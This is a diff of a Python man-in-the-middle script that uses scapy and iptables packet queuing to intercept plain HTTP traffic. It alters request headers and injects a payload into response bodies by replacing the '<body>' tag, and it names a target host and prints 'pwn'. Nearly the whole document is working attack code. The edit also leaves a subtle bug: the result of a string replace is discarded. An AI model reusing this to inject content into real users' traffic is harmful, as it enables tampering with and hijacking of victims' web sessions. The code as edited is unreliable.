@@ -46,7 +46,6 @@ def reset_iptables():
 	subprocess.call(["iptables", "--flush"])
 
 def intercept_packets(packet):
-	''' captures packet and processes it '''
 	try:
 		target_host = "tachibanalaboratories"
 		alert_message = "you have been pwned"
@@ -57,32 +56,25 @@ def intercept_packets(packet):
 		if (scapy_packet.haslayer(http.HTTPRequest)):
 		   # print(scapy_packet.show())
 			if scapy_packet[scapy.TCP].dport == 80:
-				#print("payload", scapy.raw(scapy_packet[IP].payload))
 				new_packet = set_http_request_header(scapy_packet)
 				packet.set_payload(str(new_packet))
 				
-				#print("request encoding", new_packet[http.HTTPRequest].Accept_Encoding)
+				print("req", new_packet[http.HTTPRequest])
 
 		elif (scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
-			#print("response original length", scapy_packet[http.HTTPResponse].Content_Length)
 			load = scapy_packet[scapy.Raw].load
-			#print(type(scapy_packet))
+
 			if (scapy_packet[scapy.TCP].sport == 80):
 				new_packet = set_response_headers_and_load(scapy_packet, load, payload)
 				packet.set_payload(str(new_packet))
 				#new_packet[scapy.IP].show()
-				#print("response modified length", new_packet[http.HTTPResponse].Content_Length)
-				#print("pwn")
+				print("reponse", new_packet[http.HTTPResponse].Content_Length)
+				print("pwn")
 	except:
 		PrintException()
 	
 	packet.accept()
-
-def forward_packet(*args):
-	for packet in args:
-		packet.accept()
-
-'''
+	
 #### REQUIRED FOR SOME VERSIONS OF SCAPY ####
 def get_raw_response_content_length(load):
 	content_length_re = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -104,41 +96,11 @@ def set_raw_response_content_length(load, payload):
 		print("content length: ", content_length)
 
 #############################################
-'''
 
 ## trying to figure out a way to recompress the raw layer before forwarding it on to the target but mode -1 is wrong
 ## need to get this working to avoid the need to fragment packets
 def gzip_load(load):
 	return zlib.compress(load)
-
-def fragment_packet(packet, req_or_res, *args):
-	fragmented_packets = fragment(packet, req_or_res, *args)
-	return fragmented_packets
-
-## stolen from https://github.com/secdev/scapy/blob/652b77bf12499451b47609b89abc663aa0f69c55/scapy/layers/inet.py#L891
-## this is a modified version
-
-def fragment(pkt, req_or_res, *args): #args are load, payload
-    """Fragment a big IP datagram"""
-    fragsize = 1480
-    fragsize = (fragsize + 7) // 8 * 8
-    lst = []
-    for p in pkt:
-        s = scapy.raw(p[IP].payload)
-        nb = (len(s) + fragsize - 1) // fragsize
-        for i in range(nb):
-            q = p.copy()
-            #del(q[IP].payload)
-            del(q[IP].chksum)
-            del(q[IP].len)
-            if i != nb - 1:
-                q[IP].flags |= 1
-            q[IP].frag += i * fragsize // 8          # <---- CHANGE THIS
-            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
-            r.overload_fields = p[IP].payload.overload_fields.copy()
-            q.add_payload(r)
-            lst.append(q)
-    return lst
 
 def set_response_header_value_content_length(packet, payload):
 	try:
@@ -151,30 +113,21 @@ def set_response_header_value_content_length(packet, payload):
 	except:
 		PrintException()
 
-
+		
 def set_response_headers_and_load(packet, load, payload):
 	try:
 		#compressed_load = gzip_load(load)
 		#load = set_response_content_length(load, payload)
-
 		packet = set_response_header_value_content_length(packet, payload)
 		#inject payload into raw layer
-		#print("Initial load", load)
-		#print("payload", payload)
-		payload = "<body>Hello world" # just a small string before I fix the issue with fragmentation
-
-		new_load = load.replace("<body>", payload)
-		print(type(load))
-		print("Final load", new_load)
-		packet[scapy.Raw].load = new_load
-		#print ("Raw load", packet[scapy.Raw].load)
+		load.replace("<body>", payload)
+		packet[scapy.Raw].load = load
 		del packet[scapy.IP].len
 		del packet[scapy.IP].chksum
 		del packet[scapy.TCP].chksum
 		return packet
 	except:
-		#print("Payload type:", type(payload), "payload", payload)
-		#print("packet type:", type(packet), "packet", packet)
+		print("packet type:", type(packet))
 		PrintException()
 
 def set_http_request_header(packet):
